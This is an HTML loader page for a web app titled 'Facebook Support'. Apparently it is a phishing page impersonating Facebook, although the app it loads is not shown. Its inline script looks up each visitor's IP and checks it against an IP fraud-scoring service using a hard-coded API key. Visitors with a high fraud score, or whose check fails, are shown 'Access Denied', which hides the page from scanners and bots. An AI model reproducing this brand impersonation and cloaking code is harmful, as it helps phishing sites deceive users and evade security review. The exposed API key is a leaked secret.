<!DOCTYPE html>
<html>
<head>
  <base href="/">
  <meta charset="UTF-8">
  <meta content="IE=Edge" http-equiv="X-UA-Compatible">
  <meta name="description" content="">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="facebook">
  <link rel="apple-touch-icon" href="icons/Icon-192.png">
  <link rel="icon" type="image/png" href="favicon.png"/>
  <title>Facebook Support</title>
  <link rel="manifest" href="manifest.json">
  <script>const serviceWorkerVersion = "2655113037";</script>
  <script src="flutter.js" defer></script>
</head>
<body>
<script>
  async function loadFlutterApp() {
    const appRunner = await _flutter.loader.loadEntrypoint({
      serviceWorker: { serviceWorkerVersion }
    });
    await appRunner.initializeEngine();
    appRunner.runApp();
  }

  async function checkIPWithIPQS() {
    const IPQS_API_KEY = 'EXAXJnKFgenQIOVmr8wEZykbhI0cvLyF';
    try {
      const ipifyRes = await fetch('https://api.ipify.org?format=json');
      const ipifyData = await ipifyRes.json();
      const userIp = ipifyData.ip;
      const ipqsUrl = `https://ipqualityscore.com/api/json/ip/${IPQS_API_KEY}/${userIp}?strictness=1`;
      const ipqsRes = await fetch(ipqsUrl);
      const ipqsData = await ipqsRes.json();

      if (!ipqsData.success) {
        return { allowed: false, reason: 'IPQS API call failed' };
      }

      const { fraud_score } = ipqsData;
      if (fraud_score > 70) {
        return { allowed: false, reason: 'High Fraud Score' };
      }
      return { allowed: true };
    } catch (err) {
      console.error('Error checking IP with IPQS:', err);
      return { allowed: false, reason: 'Exception occurred' };
    }
  }

  window.addEventListener('load', async function() {
    const result = await checkIPWithIPQS();
    if (!result.allowed) {
      document.body.innerHTML = `
        <h1>Access Denied</h1>
        <p>Reason: ${result.reason || 'Unknown'}</p>
      `;
    } else {
      loadFlutterApp();
    }
  });
</script>
</body>
</html>
